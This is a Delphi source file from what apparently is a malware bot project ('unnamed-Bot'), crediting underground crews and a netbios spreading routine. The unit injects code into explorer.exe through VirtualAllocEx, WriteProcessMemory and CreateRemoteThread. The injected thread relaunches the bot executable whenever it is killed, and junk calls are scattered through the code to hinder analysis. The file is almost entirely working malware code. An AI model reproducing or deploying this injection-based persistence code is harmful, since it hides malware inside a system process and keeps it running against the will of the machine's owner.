(*
        Project  : unnamed -Bot
        Author   : p0ke
        Homepage : http://unnamed.bot.nu/
        Credits  : Redlime      - Helped with coding.
                   Tzorcelan    - Helped with coding and testing spread.
                   Positron     - Coded netbios-spread orginal. I Modified it.
                                - http://positronvx.cjb.net
                   Ago          - Ported alot of c++ code from him.
                   siaze        - Inject function to memory

        Shouts   : Robb, Skäggman, #swerat, #chasenet, #undergroundkonnekt
                   xcel, Codius, KOrvEn, ZiN
        Crews    : sweRAT Crew          - http://www.swerat.com
                   chaseNet Crew        - http://www.chasenet.org
                   undergroundkonnekt   - http://undergroundkonnekt.net
*)

unit untRunOnClose;

interface

uses
  Windows,
  ELiRT,
  TLHelp32;  

var
  hKernel32: THandle;

type
  TGetModuleHandle      = Function(lpModuleName: PChar): HMODULE; stdcall;
  TLoadLibrary          = Function(lpLibFileName: PChar): HMODULE; stdcall;
  TGetProcAddress       = Function(hModule: HMODULE; lpProcName: LPCSTR): FARPROC; stdcall;
  TCloseHandle          = Function(hObject: THandle): BOOL; stdcall;
  TCreateMutex          = Function(lpMutexAttributes: PSecurityAttributes; bInitialOwner: BOOL; lpName: PAnsiChar): THandle; stdcall;
  TReleaseMutex         = Function(hMutex: THandle): BOOL; stdcall;
  TWinExec              = Function(lpCmdLine: LPCSTR; uCmdShow: UINT): UINT; stdcall;
  TGetLastError         = Function: DWORD; stdcall;
  TSleep                = Procedure(dwMilliseconds: DWORD); stdcall;

  TInjectInfo = packed record
    GetModulehandle     :TGetModuleHandle;
    LoadLibrary         :TLoadLibrary;
    GetProcAddress      :TGetProcAddress;
    Sleep               :TSleep;
    CloseHandle         :TCloseHandle;
    CreateMutexA        :TCreateMutex;
    ReleaseMutex        :TReleaseMutex;
    WinExec             :TWinExec;
    GetLastError        :TGetLastError;

    MutexHandle         :THandle;
    UninstallHandle     :THandle;

    MutexNameStr        :Array[0..255] Of Char;
    MutexNameOwnStr     :Array[0..255] Of Char;
    ExePathStr          :Array[0..255] Of Char;
    OpenStr             :Array[0..255] Of Char;
  End;

  PInjectInfo = ^TInjectInfo;

var
  hDestinationProcess           :Cardinal;
  RemoteThreadHandle            :Cardinal;
  RemoteFuncPtr                 :Pointer;
  RemoteThreadID                :Pointer;
  RemoteDataPtr                 :Pointer;
  RemoteFuncSize                :DWord;
  RemoteDataSize                :DWord;
  BytesWritten                  :DWord;
  InjectInfo                    :TInjectInfo;

  Procedure RunOnClose(szBotMutex, szOwnMutex, szBotFile: PChar);
  Function LowerCase(Const S: String): String;

implementation

Function LowerCase(Const S: String): String;
Var
  Ch    :Char;
  L     :Integer;
  Source:pChar;
  Dest  :pChar;
Begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest   := Pointer(Result);
  While (L <> 0) Do
  Begin
    Ch := Source^;
    If (Ch >= 'A') And (Ch <= 'Z') Then
      Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  End;
End;

Function GetProcPID(strProcName: String): DWORD;
Var
  cLoop         :Boolean;
  SnapShot      :THandle;
  L             :TProcessEntry32;
Begin
  Result := 0;

  SnapShot := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS or TH32CS_SNAPMODULE, 0);
  L.dwSize := SizeOf(L);
  cLoop := Process32First(SnapShot, L);
  While (Integer(cLoop) <> 0) Do
    Begin
      If LowerCase(L.szExeFile) = LowerCase(strProcName) Then
      Begin
        Result := L.th32ProcessID;
      End;
      cLoop := Process32Next(SnapShot, L);
    End;
  CloseHandle(SnapShot);
End;

Procedure ConstToArray(pFrom, pTo: PChar);
Var
  I     :Integer;
Begin
  For I := 0 To (lStrLen(pFrom) - 1) Do
    pTo[I] := pFrom[I];
End;

function RemoteFunc(pInjectInfo : PInjectInfo): dword; stdcall;
begin
  Result := 0;
  with PInjectInfo^ do
  begin
    MutexHandle := CreateMutexA(NIL, FALSE, @mutexNameOwnStr[0]);
    If GetLastError = 183 Then Exit;
    CloseHandle(MutexHandle);

    repeat
      Sleep(500);

      UninstallHandle := CreateMutexA(NIL, FALSE, '_just_die_');
      If GetLastError = 183 Then
      Begin
        Sleep(5000);
//        DeleteFile(pChar(@exePathStr[0]));
        ReleaseMutex(UninstallHandle);
        CloseHandle(UninstallHandle);
        Exit;
      End;

      MutexHandle := CreateMutexA(NIL, FALSE, @mutexNameStr[0]);
      If GetLastError <> 183 Then
      Begin
        ReleaseMutex(MutexHandle);
        WinExec(@exePathStr[0], 1);
        Sleep(10000);
      End;
      CloseHandle(MutexHandle);
    until 1 = 2;
  end;
end;

function RemoteFuncEnd:dword;stdcall;
begin
  Result := 0;
end;

function inttostr(const value: integer): string;
var
  s: string[11];
begin
  str(value, s);
  result := s;
end;

Function UselessFunction: String;
Var
  A     :Integer;
  B     :Integer;
  C     :Integer;
Begin
  Randomize;
  A := Random(100);
  B := Random(A)+Random(A);
  C := Random(B) DIV Random(A);
  Result := IntToStr(C);
End;

Procedure RunOnClose(szBotMutex, szOwnMutex, szBotFile: PChar);
begin
  ConstToArray(szBotMutex, @Injectinfo.mutexNameStr[0]);
  ConstToArray(szOwnMutex, @Injectinfo.mutexNameOwnStr[0]);
  ConstToArray(szBotFile, @injectinfo.exePathStr[0]);

  hKernel32 := GetModuleHandle('Kernel32.dll');

  InjectInfo.GetModuleHandle := GetProcAddress(hKernel32, 'GetModuleHandleA');
  InjectInfo.LoadLibrary := GetProcAddress(hKernel32, 'LoadLibraryA');
  InjectInfo.GetProcAddress := GetProcAddress(hKernel32, 'GetProcAddress');

  InjectInfo.Sleep := GetProcAddress(hKernel32, 'Sleep');
  InjectInfo.CloseHandle:= GetProcAddress(hKernel32, 'CloseHandle');
  InjectInfo.CreateMutexA := GetProcAddress(hKernel32, 'CreateMutexA');
  InjectInfo.ReleaseMutex := GetProcAddress(hKernel32, 'ReleaseMutex');
  InjectInfo.WinExec := GetProcAddress(hKernel32, 'WinExec');
  InjectInfo.GetLastError := GetProcAddress(hKernel32, 'GetLastError');

  hDestinationProcess := 0;
  hDestinationProcess := OpenProcess(PROCESS_ALL_ACCESS,FALSE, GetProcPID('explorer.exe'));
  if hDestinationProcess = 0 then exit;

  RemoteFuncSize := (Integer(@RemoteFuncEnd)- Integer(@RemoteFunc));
  RemoteDataSize := SizeOf(InjectInfo);

  UselessFunction;

  RemoteDataPtr := nil;
  RemoteDataPtr := xVirtualAllocEx(hDestinationProcess, NIL, RemoteDataSize+RemoteFuncSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if RemoteDataPtr = nil then exit;

  UselessFunction;

  WriteProcessMemory(hDestinationProcess, RemoteDataPtr, @InjectInfo, RemoteDataSize, BytesWritten);

  RemoteFuncPtr := Pointer(Integer(RemoteDataPtr)+RemoteDataSize);

  UselessFunction;

  WriteProcessMemory(hDestinationProcess, RemoteFuncPtr, @RemoteFunc, RemoteFuncSize, BytesWritten);

  UselessFunction;

  RemoteThreadHandle := xCreateRemoteThread(hDestinationProcess, nil, 0, RemoteFuncPtr, RemoteDataPtr, 0, RemoteThreadID);
End;

end.
